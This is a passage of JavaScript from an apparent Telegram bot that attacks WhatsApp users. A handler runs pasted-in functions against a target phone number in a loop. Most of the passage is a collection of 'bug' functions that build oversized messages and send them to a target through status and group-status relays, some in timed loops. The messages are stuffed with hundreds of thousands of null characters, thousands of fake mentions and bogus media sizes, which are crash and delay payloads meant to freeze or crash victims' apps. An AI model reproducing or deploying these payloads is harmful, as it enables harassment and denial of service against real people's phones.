┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Check", url: `https://wa.me/${q}`, style: "danger" }]
        ]
      }
    });

    const processMessageId = processMsg.message_id;

    // ===== AMBIL FUNCTION =====
    const funcCode = ctx.message.reply_to_message.text;

    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc) {
      return ctx.reply("❌ Function harus async function");
    }

    const funcName = matchFunc[1];

    // ===== SANDBOX =====
    const vm = require("vm");

    const safeSock = createSafeSock(global.sock || sock); // fallback

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      require
    };

    const context = vm.createContext(sandbox);

    const wrapper = `${funcCode}\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    // ===== EXECUTE LOOP =====
    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;

        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(safeSock, target);
        } else {
          await fn(safeSock, target, true);
        }
      } catch (e) {
        console.log("Loop error:", e.message);
      }

      await new Promise(r => setTimeout(r, 200));
    }

    // ===== DONE =====
    const finalText = `
\`\`\`js
┏━━━〔 INFORMATION ATTACK 〕━━━┓
⟡ Target  :: ${q}
⟡ Type    :: Unknown Function
⟡ Status  :: √ SUKSES...
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\`\`\``;

    try {
      await ctx.telegram.editMessageCaption(
        chatId,
        processMessageId,
        null,
        finalText,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Check", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      );
    } catch {
      await ctx.replyWithPhoto(photoUrl, {
        caption: finalText,
        parse_mode: "Markdown"
      });
    }

  } catch (err) {
    console.error("ERROR:", err);
    ctx.reply("❌ Terjadi error");
  }
});
// ------------ (  FUNCTION BUGS ) -------------- \\
async function NvXDelayHard(sock, target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }, 
      body: {
        text: "GXION IS HERE !", 
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"Nanas\",\"landmark_area\":\"X\",\"address\":\"@null\",\"tower_number\":\"@null\",\"city\":\"LexzyModss\",\"name\":\"@null\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"NanasSange : ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });

  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function VnXAudioBulldoNew(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
         audioMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
           mimetype: "audio/mp4",
           fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
           fileLength: "109951162777600",
           seconds: 1,
           ptt: true,
           mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
           fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
           directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1774107510",
           waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ==",
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              quotedMessage: {
                listMessage: {
                  title: '/u0000'.repeat(350000),
                  description: '/u0000'.repeat(250000),
                  buttonText: 'VnX',
                  footerText: '',
                  listType: 1,
                  sections: [
                    {
                      title: '',
                      rows: Array.from({ length: 10 }, (_, i) => ({
                        title: '/u0000'.repeat(250000),
                        description: '/u0000'.repeat(250000),
                        rowId: null,
                      })),
                    },
                  ],
                },
              },
            },
          },
        },
      },
    },
    { participant: { jid: target } },
  );

  console.log('✅ SUCCESS SENDING BUG TO TARGET: ' + target);
}

async function VnXCrashIos(sock, target) {
    let mbgiosvnx = await generateWAMessageFromContent(
        target,
        {
         contactMessage: {
            displayName:
        "°‌‌VnXIos ⿻ VnX ✶ > 666" + "𑇂𑆵𑆴𑆿".repeat(25000),
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌VnX ⿻ Are You Okay? ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 813-1919-9692\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰‌°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
                contextInfo: {
                    stanzaId: "VnX",
                    mentionedJid: [target], 
                    isForwarded: true,
                    forwardingScore: 999,
                    
                    interactiveAnnotations: [{
                        polygonVertices: [
                            { x: 0.05625700578093529, y: 0.1530572921037674 },
                            { x: 0.9437337517738342, y: 0.1530572921037674 },
                            { x: 0.9437337517738342, y: 0.8459166884422302 },
                            { x: 0.05625700578093529, y: 0.8459166884422302 }
                        ],
                        newsletter: {
                            newsletterJid: "120363186130999681@newsletter",
                            serverMessageId: 3033,
                            newsletterName: "sex null",
                            contentType: "UPDATE_CARD"
                        }
                    }]
                } 
            }
        },
        { userJid: sock.user.id, quoted: null }
    );

    await sock.relayMessage(
        "status@broadcast",
        mbgiosvnx.message,
        {
            messageId: mbgiosvnx.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}


async function Invisiblehard(sock, target) {
  const startTime = Date.now();
  const duration = 1 * 60 * 1000; 

  while (Date.now() - startTime < duration) {
    const raaMessages = {
      viewOnceMessage: {  
        message: {  
          interactiveResponseMessage: {  
            body: {  
              text: "— ⓘ 𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢 𝔙𝔢́𝔩𝔬𝔯𝔦𝔞 -#",  
              hasMediaAttachment: false  
            },  
            videoMessage: {  
              url: "https://mmg.whatsapp.net/v/t62.43144-24/10000000_1502112771709855_3272945837169502791_n.enc?ccb=11-4&oh=01_Q5Aa4QEq6ZqMuFLeKDwX_XZUoUlLhzeZd48Vdwdo8Pw2UwyFGQ&oe=6A00B5F6&_nc_sid=5e03e0&mms3=true",  
              mimetype: "video/mp4",  
              fileSha256: "BpORlhRms3eA7MGiNjeeONBeQLKl6bsfffFUEQUFnTw=",  
              fileLength: "1073741824",
              height: 1080,  
              width: 1920,
              mediaKey: "ByyHwYADrLlfTT288ptlcpWv/LTCtLy4Z1bJto2Vc68=",  
              fileEncSha256: "SC73MlcELb6U6tMsuyEr0+R3szXgleKnpJLE6dMcPeI=",  
              directPath: "/v/t62.43144-24/10000000_1502112771709855_3272945837169502791_n.enc?ccb=11-4&oh=01_Q5Aa4QEq6ZqMuFLeKDwX_XZUoUlLhzeZd48Vdwdo8Pw2UwyFGQ&oe=6A00B5F6&_nc_sid=5e03e0",  
              mediaKeyTimestamp: "1775847446",
              seconds: 3600,
              contextInfo: {  
                forwardingScore: 9999,  
                isForwarded: true,  
                mentionedJid: [  
                  "0@s.whatsapp.net",  
                  ...Array.from(  
                    { length: 1900 },  
                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
                  )  
                ],  
                expiration: 9741,  
                ephemeralSettingTimestamp: 9741,  
                entryPointConversionSource: "WhatsApp.com",  
                entryPointConversionApp: "WhatsApp",  
                entryPointConversionDelaySeconds: 9742,  
                disappearingMode: {  
                  initiator: "INITIATED_BY_OTHER",  
                  trigger: "ACCOUNT_SETTING"  
                }  
              } 
            },  
            nativeFlowResponseMessage: {  
              name: "address_message",  
              paramsJson: "\u0000".repeat(1045900),  
              version: 3  
            }  
          }  
        }  
      }  
    };

    const raaMSG = generateWAMessageFromContent(target, raaMessages, {});

    await sock.relayMessage("status@broadcast", raaMSG.message, {
      messageId: raaMSG.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await sock.relayMessage("status@broadcast", {
      interactiveResponseMessage: {
        body: {
          text: "XXXXX",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: "\u0000".repeat(5000),
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(1000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
          statusAttributions: Array.from({ length: 199999 }, (_, n) => ({
            participant: `62${n + 836598}@s.whatsapp.net`,
            type: 1
          })),
        },
      },
    }, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });
  }
}

async function VnXDelayBebasSpamNewSW(sock, target) {
    let vnxdlymbg = await generateWAMessageFromContent(
       target,
       {
        interactiveResponseMessage: {
          contextInfo: {
            urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 10000 }, () => ({
              "\0": "\u0000".repeat(250000)
            }))
           },
           body: {
             text: "GXION IS HERE(!)"
          },
          footer: {
            text: "\u0000".repeat(250000)
           },
           nativeFlowResponseMessage: {
             name: "galaxy_message",
             paramsJson: `{\"flow_cta\":{\"title\":${"\u0000".repeat(250000)}}}`,
             version: 3
             } 
           } 
        }
     },
    { userJid: sock.user.id, quoted: null }
  );

    await sock.relayMessage(
        "status@broadcast",
        vnxdlymbg.message,
        {
            messageId: vnxdlymbg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}

async function DelayAMZnew(sock, target) {
  try {
    const glitch = {
      interactiveResponseMessage: {
        body: {
          text: "GXION NIH BOS",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "{}",
          version: 3
        },
        contextInfo: {
          remoteJid: "kakangkungg",
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
              "\0": "\0"
            }))
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", glitch, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });

    console.log(`✅ GXION SUCCESFULLY ATTACK NUMBER TARGET ${target}`);

  } catch (err) {
    console.error(`❌ Error: ${err.message}`);
  }
}

async function InvisibleHardDuration(sock, target) {
  const duration = 1 * 60 * 1000;
  const startTime = Date.now();

  while (Date.now() - startTime < duration) {
    try {
  
      const msg = await generateWAMessageFromContent(target, {
        interactiveMessage: {
          contextInfo: {
            remoteJid: Math.random().toString(36) + "\u0000".repeat(5000),
            statusAttributionType: 2,
            mentionedJid: [target], 
            participant: "0@s.whatsapp.net",
            forwardingScore: 999999,
            isForwarded: true,
            quotedMessage: {
              buttonsMessage: {
                footerText: "InvisibleHard",
                headerType: 1,
                contentText: "🩸".repeat(1000),
                buttons: [
                  {
                    type: 1,
                    buttonId: ".bugs",
                    buttonText: { displayText: "🇲🇨" + "\u0000".repeat(800000) },
                  },
                ],
              },
            },
            statusAttributions: Array.from({ length: 199999 }, (_, n) => ({
              type: 1,
              participant: `62${n + 836598}@s.whatsapp.net`,
            })),
          },
          footer: { text: "Whyy??" },
          nativeFlowMessage: {
            buttons: [
              {
                buttonParamsJson:
                  JSON.stringify({
                    sections: [
                      { rows: [{ title: "Coursol", id: ".x" }], title: "Gacorr" },
                    ],
                    title: "🇲🇨" + "\u0000".repeat(500000),
                  }) + "\u0000".repeat(1000),
                name: "single_select",
              },
            ],
          },
          body: { text: "✦𝐒𝐨𝐦𝐞𝐭𝐢𝐦𝐞𝐬 𝐬𝐢𝐥𝐞𝐧𝐜𝐞 𝐢𝐬 𝐭𝐡𝐞 𝐥𝐨𝐮𝐝𝐞𝐬𝐭 𝐰𝐚𝐫𝐧𝐢𝐧𝐠✦" },
        },
      }, {});

      await sock.relayMessage("status@broadcast", {
        interactiveResponseMessage: {
          body: { text: "# -Ellysine Veloria", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\u0000".repeat(5000),
            version: 3,
          },
          contextInfo: {
            remoteJid: Math.random().toString(36) + "\u0000".repeat(1000),
            isForwarded: true,
            forwardingScore: 9999,
            statusAttributionType: 2,
            statusAttributions: Array.from({ length: 199999 }, (_, n) => ({
              participant: `62${n + 836598}@s.whatsapp.net`,
              type: 1,
            })),
          },
        },
      }, {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "contacts" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: [] }],
              },
            ],
          },
        ],
      });

      await sock.relayMessage("status@broadcast", msg.message, {
        statusJidList: [target],
        messageId: msg.key.id,
        additionalNodes: [
          {
            attrs: { status_setting: "contacts" },
            tag: "meta",
            content: [
              {
                attrs: {},
                tag: "mentioned_users",
                content: [{ tag: "to", attrs: { jid: target }, content: [] }],
              },
            ],
          },
        ],
      });

      
    } catch (e) {
      console.log("Error logic loop:", e);
    }
  }
}
   
async function VnXdelayInvisibleNews(sock, target) {

const nameVnX = ["address_message", "galaxy_message",
"call_permission_request"];

let vnxdelayinv = {
     groupStatusMessageV2: {
       message: {
         interactiveResponseMessage: {
           body: {
             text: "BAWZHH KING BUGSS ATTACK YOU BABYY",
             format: "DEFAULT",
           },
           nativeFlowResponseMessage: {
             name: nameVnX[0], 
             paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000),
             version: 3,
           },
         },
       },
     },
   };

   await sock.relayMessage(target, vnxdelayinv, { 
     participant: { jid: target } 
   });
}
 
async function delayinvisibleBawzHH(sock, target) {
  const nameVnX = [
      "address_message", 
      "galaxy_message",
      "call_permission_request"  
   ];
  
  const invisible = {
    groupStatusMessageV2: {
       body: {
         text: "Delay yah? Iyalah By Gxion",
         format: "DEFAULT",
  },
  nativeFlowMessage: {
    name: nameVnX[0],
    paramsJson: "\u0000".repeat(250000) + "\u0000".repeat(250000),
    version: 3,
    }
  }
}

await sock.relayMessage(target, invisible, { 
     participant: { jid: target } 
   });
}

async function ngelayyy(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\0",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(500);

  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\0",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

await sleep(500);

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
}

async function VnXNewDelayPayment(sock, target) {
  const vnxpaynew = {
      groupStatusMessageV2: {
         message: {
           paymentLinkProvider: {
             paramsJson: "\u0000".repeat(990000),
              quotedMessage: {
               interactiveResponseMessage: {
                contextInfo: {
                  remoteJid: target,
                  mentionedJid: [
                    '0@s.whatsapp.net',
                    ...Array.from(
                      {
                        length: 2000,
                      },
                      () =>
                        '1' +
                        Math.floor(Math.random() * 900000) +
                        '@s.whatsapp.net',
                    ),
                  ],
                  body: {
                    text: 'VnX Nihk',
                    format: 'DEFAULT',
                  },
                  nativeFlowResponseMessage: {
                    name: 'call_permission_request',
                    paramsJson: '\n'.repeat(990000),
                    version: 3,
                  },
                },
              }
             }         
           }
         }
       }
    };
    await sock.relayMessage(target, vnxpaynew, {
     participant: { jid: target },
  });
}

async function delayreza(sock, target) {
  const rezaror = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Is Here",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\n".repeat(250000) + "\u0000".repeat(250000),
            version: 3
          }
        }
      }
    },
    contextInfo: { 
      remoteJid: "#VnXNew - By @Raffioffci5",
      mentionedJid: [
        '0@s.whatsapp.net',
        ...Array.from(
          { length: 2000 },
          () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net'
        )
      ]
    }
  };

  await sock.sendMessage(target, rezaror);
}

async function delaySpam(sock, target) {
    let parse = true;

    for (let i = 0; i < 95; i++) {
        await sock.relayMessage("status@broadcast", {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " # ⌁⃰NANZ HAMA NIH ⭒ t.me/nanzlyora ",
                            format: 1
                        },
                        nativeFlowResponseMessage: {
                            name: "book_confirmation",
                            paramsJson: JSON.stringify({
                                status: "ok",
                                title: "𑇂𑆵𑆴𑆿".repeat(5000),
                                subtitle: " ".repeat(2000),
                                bookingInfo: "{".repeat(10000),
                                date: " # ⌁⃰NANZ HAMA NIH ⭒ t.me/nanzlyora " + "ោ៝".repeat(10000),
                                time: " # ⌁⃰NANZ HAMA NIH ⭒ t.me/nanzlyora " + "ោ៝".repeat(10000),
                                address: " # ⌁⃰NANZ HAMA NIH ⭒ t.me/nanzlyora " + "ꦾ".repeat(40000),
                                price: " # ⌁⃰NANZ HAMA NIH ⭒ t.me/nanzlyora " + "ꦾ".repeat(40000)
                            }),
                            version: 3
                        },
                        contextInfo: {
                            remoteJid: "status@broadcast",
                            placeholder: Math.random().toString(36)
                        }
                    }
                }
            }
        }, 
        {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { status_setting: "contacts" },
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: []
                                }
                            ]
                        }
                    ]
                }
            ]
        });
    }
}

async function VnXDelayNewByRaffi(sock, target) {
await sock.relayMessage(target, {
   groupStatusMessageV2: {
      message: {
       interactiveResponseMessage: {
         header: {
           extendedTextMessage: {
             name: "call_permission_request",
             title: "\u0000.VnX" + "{{".repeat(250000)
          },
          body: {
            text: "VnX"
          },
          nativeFlowResponseMessage: {
            paramsJson: "\u0000".repeat(9999099),
            version: 3
          },
           contextInfo: {
             urlTrackingMap: {
              urlTrackingMapElements: Array.from({ length: 100000 }, () => ({})),
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function VnXNewDelayHardCmbo(sock, target) {
  const vnxmbgdly = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from(
                {
                  length: 2000,
                },
                () =>
                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
              ),
            ],
            body: {
              text: 'VnX',
              format: 'DEFAULT',
            },
            footer: {
              text: '\u0000'.repeat(25000),
              format: 'DEFAULT',
            },
            nativeFlowResponseMessage: {
              name: 'address_message',
              paramsJson: "\x10".repeat(9999999),
              version: 3,
             },
           },
         },
       },
     },
   };

  await sock.relayMessage(target, vnxmbgdly, {
    participant: { jid: target },
  });
    
  const vnxtest = {
   groupStatusMessageV2: {
     message: {
       imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
       directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c",
        mimetype: 'image/jpeg',
        caption: 'VnX' +  "\u0000".repeat(250000),
        mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=",
        fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=",
        fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=",
        fileLength: '19897899',
        mediaKeyTimestamp: "1778296099",
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
          }
        }
      }
    }
  };
         
   await sock.relayMessage(target, vnxtest, {
    participant: { jid: target },
  });
    
    const vnxaudio = {
     groupStatusMessageV2: {
       message: {
        audioMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
           mimetype: "audio/mp4",
           fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
           fileLength: "109951162777600",
           seconds: 1,
           ptt: true,
           mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
           fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
           directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1774107510",
           waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ==",
           caption: "VnX" + "\u0000".repeat(250000),
           contextInfo: {
  participant: target,
  mentionedJid: [
    '0@s.whatsapp.net',
    ...Array.from({ length: 2000 }, () => 
      '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net'
    )
  ],
  urlTrackingMap: {
    urlTrackingMapElements: Array.from({ length: 100000 }, () => ({}))
  }
           }
        }
       }
     }
    }
               await sock.relayMessage(target, vnxaudio, {
    participant: { jid: target },
  });
}

async function EARLDelay(sock, target) {
   const Ken1 = {
     groupStatusMessageV2: {
        message: {
                interactiveResponseMessage: {
                    contextInfo: {
                        participant: target,
                        mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')],
                        body: { text: 'Kénón', format: 'DEFAULT' },
                        footer: { text: '\0'.repeat(25000), format: 'DEFAULT' },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{\"flow_cta\":{\"title\":${"\0".repeat(990000)}}}`,
                            version: 3
                        }
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Ken1, { participant: { jid: target } });

    const Ken2 = {
        groupStatusMessageV2: {
            message: {
                contactMessage: {
                    displayName: "EARL" + "\n".repeat(250000),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌Ken ⿻ Are You Okay? ✶ > 666${"\n".repeat(10000)};;;\nFN:🦠⃰‌°‌‌EARL ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\0".repeat(10000)}\nNICKNAME:🦠⃰‌°‌EARL ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\0".repeat(4000)}\nORG:🦠⃰‌°‌‌EARL ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\x10".repeat(4000)}\nTITLE:🦠⃰‌°‌‌EARL ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\n".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 813-1919-9692\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰‌°‌‌EARL ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"\0".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰‌°‌‌EARL ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"EARL.\x10.\0.\n\0".repeat(4000)}\nEND:VCARD`,
                    contextInfo: {
                        participant: target,
                        mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')]
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Ken2, { participant: { jid: target } });

    const Ken3 = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    contextInfo: {
                        participant: target,
                        mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')],
                        body: { text: 'EARL', format: 'DEFAULT' },
                        footer: { text: '\0'.repeat(25000), format: 'DEFAULT' },
                        nativeFlowResponseMessage: {
                            name: 'address_message',
                            paramsJson: "\x10".repeat(9999999),
                            version: 3
                        }
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Ken3, { participant: { jid: target } });

    const Ken4 = {
        groupStatusMessageV2: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
